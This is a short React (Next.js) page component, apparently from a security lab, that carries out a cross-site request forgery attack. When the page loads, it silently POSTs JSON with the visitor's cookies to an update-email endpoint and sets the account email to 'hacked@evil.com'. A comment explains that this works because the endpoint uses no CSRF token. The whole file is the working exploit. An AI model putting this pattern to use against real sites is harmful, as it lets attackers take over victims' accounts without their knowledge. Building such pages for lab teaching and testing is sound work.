"use client"
import { useEffect } from "react";

// update the email of the user automatically when the user visits this page . its due to no usage of csrf token.

export default function Evilpage() {
    useEffect(() => {
      fetch("/api/lab-user/update-email",{
        method : "POST",
        headers : {
            "Content-Type" : "application/json"
        },
        body : JSON.stringify({Email : "hacked@evil.com" , Username : "weiner"}),
        credentials : "include"
      })
    }, []);

    return <h1>😈 Sending JSON CSRF Attack...</h1>;
}
